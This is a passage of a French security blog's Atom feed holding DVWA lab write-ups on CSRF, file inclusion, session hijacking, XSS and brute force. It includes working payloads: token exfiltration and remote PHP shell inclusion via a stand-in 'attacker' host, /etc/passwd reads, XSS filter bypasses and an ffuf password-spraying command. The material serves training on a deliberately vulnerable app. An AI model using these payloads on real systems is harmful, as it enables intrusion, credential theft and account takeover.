&lt;&#x2F;span&gt;&lt;span&gt;          .&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;then&lt;&#x2F;span&gt;&lt;span&gt;(
&lt;&#x2F;span&gt;&lt;span&gt;            (t) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;=&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;              (document.location =
&lt;&#x2F;span&gt;&lt;span&gt;                &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;http:&#x2F;&#x2F;attacker&#x2F;csrf.html?token=&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; +
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;t&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;match&lt;&#x2F;span&gt;&lt;span&gt;(
&lt;&#x2F;span&gt;&lt;span&gt;                  &#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;name=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;[&amp;#39;&amp;quot;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;user_token&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;[&amp;#39;&amp;quot;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt; value=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;[&amp;#39;&amp;quot;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;&amp;#39;&amp;quot;]&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;[&amp;#39;&amp;quot;]&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;,
&lt;&#x2F;span&gt;&lt;span&gt;                )[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;]),
&lt;&#x2F;span&gt;&lt;span&gt;        ),
&lt;&#x2F;span&gt;&lt;span&gt;      );
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;script&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;La page attaquante récupère le token via URL param et soumet le formulaire dynamique :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;token &lt;&#x2F;span&gt;&lt;span&gt;= new URLSearchParams(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;location&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;search&lt;&#x2F;span&gt;&lt;span&gt;).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;get&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;token&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;); &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;form&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;user_token&lt;&#x2F;span&gt;&lt;span&gt;.value=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;token&lt;&#x2F;span&gt;&lt;span&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;form&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;submit&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>DVWA - File Inclusion</title>
        <published>2025-12-23T00:00:00+00:00</published>
        <updated>2025-12-23T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://theora59-dev.github.io/blog/cours/file-inclusion/"/>
        <id>https://theora59-dev.github.io/blog/cours/file-inclusion/</id>
        
        <content type="html" xml:base="https://theora59-dev.github.io/blog/cours/file-inclusion/">&lt;h2 id=&quot;easy&quot;&gt;Easy&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Aucune restriction : &lt;code&gt;?page=&#x2F;etc&#x2F;passwd&lt;&#x2F;code&gt; lit le fichier système Linux affichant les hashes utilisateurs.&lt;&#x2F;li&gt;
&lt;li&gt;Pour Remote file Inclusion (RFI) si &lt;code&gt;allow_url_include=On&lt;&#x2F;code&gt; dans &lt;code&gt;php.ini&lt;&#x2F;code&gt; : &lt;code&gt;?page=http:&#x2F;&#x2F;attacker&#x2F;shell.txt&lt;&#x2F;code&gt; exécute un shell PHP distant.&lt;&#x2F;li&gt;
&lt;li&gt;Objectif typique : &lt;code&gt;?page=..&#x2F;chemin&#x2F;vers&#x2F;le&#x2F;fichier&#x2F;recherché.txt&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;medium&quot;&gt;Medium&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Strip &lt;code&gt;..&#x2F;&lt;&#x2F;code&gt; via &lt;code&gt;str_replace(&#x27;..&#x2F;&#x27;, &#x27;&#x27;, $page)&lt;&#x2F;code&gt; mais accepte chemins absolus et wrappers PHP.&lt;&#x2F;li&gt;
&lt;li&gt;LFI : &lt;code&gt;?page=..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&lt;&#x2F;code&gt; (plus de &lt;code&gt;..&#x2F;&lt;&#x2F;code&gt; que filtré) ou &lt;code&gt;?page=php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource=index.php&lt;&#x2F;code&gt; pour source encodé.&lt;&#x2F;li&gt;
&lt;li&gt;RFI : &lt;code&gt;?page=http:&#x2F;&#x2F;attacker&#x2F;shell.php%00&lt;&#x2F;code&gt; (le null byte termine prématurément la concaténation&#x2F; termine la chaine de caractère).&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;hard&quot;&gt;Hard&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Whitelist &lt;code&gt;file*&lt;&#x2F;code&gt; ou &lt;code&gt;include.php&lt;&#x2F;code&gt; via &lt;code&gt;preg_match(&#x27;&#x2F;^file&#x2F;&#x27;, $page)&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;li&gt;LFI : &lt;code&gt;?page=file..&#x2F;..&#x2F;etc&#x2F;passwd&lt;&#x2F;code&gt; (wildcard file + path traversal) ou &lt;code&gt;?page=file.php:&#x2F;&#x2F;filter&#x2F;read=convert.base64-encode&#x2F;resource=&#x2F;etc&#x2F;passwd&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;li&gt;RFI bloqué, mais null byte : &lt;code&gt;?page=filehttp:&#x2F;&#x2F;attacker&#x2F;shell.php%00&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>DVWA - ID de session vulnérable</title>
        <published>2025-12-23T00:00:00+00:00</published>
        <updated>2025-12-23T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://theora59-dev.github.io/blog/cours/weak-session-id/"/>
        <id>https://theora59-dev.github.io/blog/cours/weak-session-id/</id>
        
        <content type="html" xml:base="https://theora59-dev.github.io/blog/cours/weak-session-id/">&lt;blockquote&gt;
&lt;p&gt;Utilisez L&#x27;extension firefox &quot;Cookie Editor&quot; pour faciliter l&#x27;édition des cookie de session (où autre)&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h2 id=&quot;easy&quot;&gt;Easy&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Les cookies de session suivent une suite logique simple, incrémentée à chaque nouvelle session.&lt;&#x2F;li&gt;
&lt;li&gt;Ouvrez deux onglets : notez le cookie &quot;PHPSESSID&quot; du premier (ex. : 1), créez-en un second pour obtenir 2, puis prédisez 3 pour hijacker une session admin.&lt;&#x2F;li&gt;
&lt;li&gt;Le cookie change toutes les quelques secondes lors de la création de session, sans randomisation.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;medium&quot;&gt;Medium&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Le cookie utilise un timestamp epoch (secondes depuis le 1er janvier 1970 UTC) comme base.&lt;&#x2F;li&gt;
&lt;li&gt;Générez une session, extrayez le cookie (ex. : 1703350000), attendez 10 secondes pour le suivant, ou calculez manuellement en ajoutant l&#x27;intervalle observé (souvent 1-10s).&lt;&#x2F;li&gt;
&lt;li&gt;Hijackez en injectant le cookie prédit dans un navigateur pour accéder à une session valide.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;high&quot;&gt;High&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Le cookie combine timestamp + élément faible, hashé (souvent MD5 ou SHA1 détectable).&lt;&#x2F;li&gt;
&lt;li&gt;Analysez plusieurs cookies : divisez par epoch pour isoler le timestamp, testez le préfixe&#x2F;suffixe fixe, puis générez le hash manuellement ou via outils comme CrackStation.net pour les hashes courts.&lt;&#x2F;li&gt;
&lt;li&gt;Exemple : si le hash est équivalent à MD5(timestamp) ou MD5(smth), essayez de prédire pour le temps courant et injectez pour usurper la session.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>DVWA - XSS (DOM)</title>
        <published>2025-12-23T00:00:00+00:00</published>
        <updated>2025-12-23T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://theora59-dev.github.io/blog/cours/xss-dom/"/>
        <id>https://theora59-dev.github.io/blog/cours/xss-dom/</id>
        
        <content type="html" xml:base="https://theora59-dev.github.io/blog/cours/xss-dom/">&lt;blockquote&gt;
&lt;p&gt;Approche alternative: Bruteforcer le champs vulnérable&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;easy&quot;&gt;Easy&lt;&#x2F;h1&gt;
&lt;ul&gt;
&lt;li&gt;Aucune protection : modifiez l&#x27;URL &lt;code&gt;?default=&amp;lt;script&amp;gt;alert(&#x27;DOM XSS Easy!&#x27;)&amp;lt;&#x2F;script&amp;gt;&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;li&gt;Le JS parse default, &lt;code&gt;document.write()&lt;&#x2F;code&gt; exécute le payload dans &lt;code&gt;&amp;lt;option&amp;gt;&lt;&#x2F;code&gt;, déclenchant l&#x27;alert au chargement DOM.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h1 id=&quot;medium&quot;&gt;Medium&lt;&#x2F;h1&gt;
&lt;ul&gt;
&lt;li&gt;Filtre &lt;code&gt;stripos($default, &#x27;&amp;lt;script&amp;gt;&#x27;)&lt;&#x2F;code&gt; redirige vers &lt;code&gt;?default=English&lt;&#x2F;code&gt; si la balise est détectée.&lt;&#x2F;li&gt;
&lt;li&gt;Utilisez &lt;code&gt;?default=&amp;lt;&#x2F;select&amp;gt;&amp;lt;svg onload=alert(&#x27;DOM XSS Medium&#x27;)&amp;gt;&lt;&#x2F;code&gt; pour casser &lt;code&gt;&amp;lt;select&amp;gt;&lt;&#x2F;code&gt; ouvert et injecter nouvelle balise.&lt;&#x2F;li&gt;
&lt;li&gt;Autres : &lt;code&gt;&amp;lt;&#x2F;select&amp;gt;&amp;lt;img src=x onerror=alert(&#x27;XSS&#x27;)&amp;gt;&lt;&#x2F;code&gt; ou &lt;code&gt;&amp;lt;&#x2F;select&amp;gt;&amp;lt;body onload=alert(1)&amp;gt;&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h1 id=&quot;hard&quot;&gt;Hard&lt;&#x2F;h1&gt;
&lt;ul&gt;
&lt;li&gt;Switch whitelist 4 langues (English, Français, Español, Deutsch) ; tout autre redirige vers &lt;code&gt;?default=English&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;li&gt;Payload : &lt;code&gt;?default=English&amp;amp;&amp;lt;&#x2F;select&amp;gt;&amp;lt;svg onload=alert(&#x27;DOM XSS High&#x27;)&amp;gt;&lt;&#x2F;code&gt; (opérateur &lt;code&gt;&amp;amp;&lt;&#x2F;code&gt; valide la whitelist, &lt;code&gt;&amp;lt;&#x2F;select&amp;gt;&lt;&#x2F;code&gt; casse DOM).&lt;&#x2F;li&gt;
&lt;li&gt;Alternatives : &lt;code&gt;English#&amp;lt;&#x2F;select&amp;gt;&amp;lt;body onload=alert(&#x27;XSS&#x27;)&amp;gt; ou English&amp;amp;&amp;lt;&#x2F;select&amp;gt;&amp;lt;marquee onstart=alert(1)&amp;gt;&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>DVWA - XSS (REFLECTED)</title>
        <published>2025-12-23T00:00:00+00:00</published>
        <updated>2025-12-23T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://theora59-dev.github.io/blog/cours/xss-reflected/"/>
        <id>https://theora59-dev.github.io/blog/cours/xss-reflected/</id>
        
        <content type="html" xml:base="https://theora59-dev.github.io/blog/cours/xss-reflected/">&lt;h2 id=&quot;easy&quot;&gt;Easy&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Aucune sanitisation : entrez &lt;code&gt;&amp;lt;script&amp;gt;alert(&#x27;XSS Reflected Easy!&#x27;)&amp;lt;&#x2F;script&amp;gt;&lt;&#x2F;code&gt; dans le champ &quot;Name&quot;.&lt;&#x2F;li&gt;
&lt;li&gt;La page reflète immédiatement le payload et exécute l&#x27;alert au chargement, confirmant l&#x27;absence de protections.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;medium&quot;&gt;Medium&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Filtre &lt;code&gt;str_replace(&#x27;script&#x27;, &#x27;&#x27;, $name)&lt;&#x2F;code&gt; sensible à la casse sur minuscules.&lt;&#x2F;li&gt;
&lt;li&gt;Utilisez &lt;code&gt;&amp;lt;sCriPt&amp;gt;alert(&#x27;XSS Medium!&#x27;)&amp;lt;&#x2F;sCriPt&amp;gt;&lt;&#x2F;code&gt; ou &lt;code&gt;&amp;lt;SCRIPT&amp;gt;alert(&#x27;XSS&#x27;)&amp;lt;&#x2F;SCRIPT&amp;gt;&lt;&#x2F;code&gt; pour éviter le remplacement.&lt;&#x2F;li&gt;
&lt;li&gt;Le payload s&#x27;exécute car le filtre ignore les majuscules, typique des blacklists naïves.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;hard&quot;&gt;Hard&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Utilise &lt;code&gt;htmlspecialchars()&lt;&#x2F;code&gt; + blacklist &quot;script&quot; insensible à la casse (stripos).&lt;&#x2F;li&gt;
&lt;li&gt;Injectez &lt;code&gt;&amp;lt;img src=x onerror=alert(&#x27;XSS High!&#x27;)&amp;gt;&lt;&#x2F;code&gt; ou &lt;code&gt;&quot;&amp;gt;&amp;lt;script&amp;gt;alert(&#x27;XSS&#x27;)&amp;lt;&#x2F;script&amp;gt;&lt;&#x2F;code&gt; pour fermer l&#x27;attribut value et ouvrir un nouveau contexte.&lt;&#x2F;li&gt;
&lt;li&gt;L&#x27;événement &lt;code&gt;onerror&lt;&#x2F;code&gt; déclenche JS sur image invalide ; testez aussi &lt;code&gt;&amp;lt;svg onload=alert(&#x27;High&#x27;)&amp;gt;&lt;&#x2F;code&gt; pour polyvalence.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>DVWA - XSS (STORED)</title>
        <published>2025-12-23T00:00:00+00:00</published>
        <updated>2025-12-23T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://theora59-dev.github.io/blog/cours/xss-stored/"/>
        <id>https://theora59-dev.github.io/blog/cours/xss-stored/</id>
        
        <content type="html" xml:base="https://theora59-dev.github.io/blog/cours/xss-stored/">&lt;h2 id=&quot;low&quot;&gt;Low&lt;&#x2F;h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Voici un apercu de l&#x27;application vulnérable
&lt;img src=&quot;https:&#x2F;&#x2F;theora59-dev.github.io&#x2F;blog&#x2F;processed_images&#x2F;illustration1.a9d144401812edcd.png&quot; alt=&quot;Image d&amp;#x27;illustration&quot;
     width=&quot;681&quot; height=&quot;423&quot;
     sizes=&quot;(min-width: 920px) 784px, (min-width: 700px) calc(82vw + 46px), calc(100vw - 40px)&quot; 
     srcset=&quot;https:&#x2F;&#x2F;theora59-dev.github.io&#x2F;blog&#x2F;processed_images&#x2F;illustration1.e7fd71c5af843e2e.png 640w&quot;
     loading=&quot;lazy&quot;&gt;
&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Au niveau Easy, aucune protection n&#x27;empêche l&#x27;injection de code JavaScript. Entrez simplement &lt;code&gt;&amp;lt;script&amp;gt;alert(&#x27;Something&#x27;)&amp;lt;&#x2F;script&amp;gt;&lt;&#x2F;code&gt; dans le champ &quot;Message&quot; du guestbook et soumettez.
&lt;img src=&quot;https:&#x2F;&#x2F;theora59-dev.github.io&#x2F;blog&#x2F;processed_images&#x2F;illustration2.3cfbf1f9c6454715.png&quot; alt=&quot;Image d&amp;#x27;illustration&quot;
     width=&quot;670&quot; height=&quot;151&quot;
     sizes=&quot;(min-width: 920px) 784px, (min-width: 700px) calc(82vw + 46px), calc(100vw - 40px)&quot; 
     srcset=&quot;https:&#x2F;&#x2F;theora59-dev.github.io&#x2F;blog&#x2F;processed_images&#x2F;illustration2.0df2807d669a780b.png 640w&quot;
     loading=&quot;lazy&quot;&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;medium&quot;&gt;Medium&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;DVWA filtre la chaîne &quot;script&quot; en minuscules via str_replace, mais ignore les variantes de casse.&lt;&#x2F;li&gt;
&lt;li&gt;Utilisez &lt;code&gt;&amp;lt;ScRiPt&amp;gt;alert(&#x27;XSS Stored Medium!&#x27;)&amp;lt;&#x2F;ScRiPt&amp;gt;&lt;&#x2F;code&gt; ou &lt;code&gt;&amp;lt;SCRIPT&amp;gt;alert(&#x27;XSS&#x27;)&amp;lt;&#x2F;SCRIPT&amp;gt;&lt;&#x2F;code&gt; pour contourner le remplacement partiel.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;hard&quot;&gt;Hard&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;L&#x27;application protège le champs &quot;Message&quot; suffisamment, et le champ &quot;Name&quot; limite la quantitée de caractère entré.&lt;&#x2F;li&gt;
&lt;li&gt;Il faut donc utiliser un proxy (Burp) pour auditer correctement l&#x27;applicative.
&lt;img src=&quot;https:&#x2F;&#x2F;theora59-dev.github.io&#x2F;blog&#x2F;processed_images&#x2F;illustration3.6474c079e4b27c7d.png&quot; alt=&quot;Image d&amp;#x27;illustration&quot;
     width=&quot;1257&quot; height=&quot;361&quot;
     sizes=&quot;(min-width: 920px) 784px, (min-width: 700px) calc(82vw + 46px), calc(100vw - 40px)&quot; 
     srcset=&quot;https:&#x2F;&#x2F;theora59-dev.github.io&#x2F;blog&#x2F;processed_images&#x2F;illustration3.c3e4b5f4bd7e0f46.png 640w,
             https:&#x2F;&#x2F;theora59-dev.github.io&#x2F;blog&#x2F;processed_images&#x2F;illustration3.f178ce2c7e8b7b75.png 784w&quot;
     loading=&quot;lazy&quot;&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;Et ça fonctionne !!
&lt;img src=&quot;https:&#x2F;&#x2F;theora59-dev.github.io&#x2F;blog&#x2F;processed_images&#x2F;illustration4.83c3cabb360687f9.png&quot; alt=&quot;Image d&amp;#x27;illustration&quot;
     width=&quot;710&quot; height=&quot;602&quot;
     sizes=&quot;(min-width: 920px) 784px, (min-width: 700px) calc(82vw + 46px), calc(100vw - 40px)&quot; 
     srcset=&quot;https:&#x2F;&#x2F;theora59-dev.github.io&#x2F;blog&#x2F;processed_images&#x2F;illustration4.fae5db4c285dc6b3.png 640w&quot;
     loading=&quot;lazy&quot;&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>DVWA - Brute Force</title>
        <published>2025-12-22T00:00:00+00:00</published>
        <updated>2025-12-22T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://theora59-dev.github.io/blog/cours/brute-force/"/>
        <id>https://theora59-dev.github.io/blog/cours/brute-force/</id>
        
        <content type="html" xml:base="https://theora59-dev.github.io/blog/cours/brute-force/">&lt;h2 id=&quot;easy&quot;&gt;Easy:&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Utiliser l&#x27;outil FFUF:
(Mettre USERFUZZ et PASSFUZZ dans &lt;code&gt;request.txt&lt;&#x2F;code&gt; )&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ffuf -request-proto&lt;&#x2F;span&gt;&lt;span&gt; http&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -c -r -mode&lt;&#x2F;span&gt;&lt;span&gt; clusterbomb&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -request&lt;&#x2F;span&gt;&lt;span&gt; request.txt 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-w&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;metasploit&#x2F;unix_users.txt:USERFUZZ 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-w&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;metasploit&#x2F;unix_passwords.txt:PASSFUZZ&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -fw&lt;&#x2F;span&gt;&lt;span&gt; 250
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;medium&quot;&gt;Medium:&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Privilégier &lt;code&gt;ffuf&lt;&#x2F;code&gt; à &lt;code&gt;hydra&lt;&#x2F;code&gt; ou &lt;code&gt;burpsuite&lt;&#x2F;code&gt; (Trop complexe ou complet):&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ffuf -c -u &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;http:&#x2F;&#x2F;...........&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -w&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-b &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;PHPSESSID=..........;&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -fs&lt;&#x2F;span&gt;&lt;span&gt; lataille
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;remplacer le champs à brute forcer dans l&#x27;URL avec le mot clef &lt;code&gt;FUZZ&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;li&gt;prendre des wordlists courtes si pas de temps&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Arguments&lt;&#x2F;th&gt;&lt;th&gt;Explications&lt;&#x2F;th&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;thead&gt;&lt;tbody&gt;
&lt;tr&gt;&lt;td&gt;-c&lt;&#x2F;td&gt;&lt;td&gt;Mode Couleur&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
&lt;tr&gt;&lt;td&gt;-u&lt;&#x2F;td&gt;&lt;td&gt;préciser l&#x27;url&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
&lt;tr&gt;&lt;td&gt;-w&lt;&#x2F;td&gt;&lt;td&gt;préciser la wordlist&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
&lt;tr&gt;&lt;td&gt;-b&lt;&#x2F;td&gt;&lt;td&gt;préciser les cookies de sessions&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
&lt;tr&gt;&lt;td&gt;-fs&lt;&#x2F;td&gt;&lt;td&gt;éliminer les faux positifs en triant par la taille (size) de la réponse&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
&lt;&#x2F;tbody&gt;&lt;&#x2F;table&gt;
&lt;h2 id=&quot;hard&quot;&gt;Hard:&lt;&#x2F;h2&gt;
&lt;p&gt;Si le &lt;strong&gt;cookie de session&lt;&#x2F;strong&gt; change à chaque fois:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;faire un script pour générer dynamiquement le token CSRF ( != cookie de connexion)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#!&#x2F;bin&#x2F;bash
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;BASE_URL&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;http:&#x2F;&#x2F;172.18.74.130:4280&#x2F;vulnerabilities&#x2F;brute&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;COOKIES&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;PHPSESSID=d191bfc7ef1d4393a6ca0f25b0c94425; security=high&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;WORDLIST&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;FOUND&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0
